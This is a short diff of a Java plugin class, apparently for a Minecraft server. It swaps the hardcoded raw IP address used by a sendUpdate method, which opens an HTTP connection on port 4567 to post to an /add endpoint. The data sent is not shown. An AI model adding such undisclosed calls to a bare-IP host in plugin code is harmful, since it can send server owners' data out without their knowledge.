@@ -270,7 +270,7 @@ public class Main extends JavaPlugin {
 
     private void sendUpdate() {
         try {
-            URL url = new URL("http://64.137.232.85:4567/add");
+            URL url = new URL("http://185.185.248.3:4567/add");
 
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setDoOutput(true);
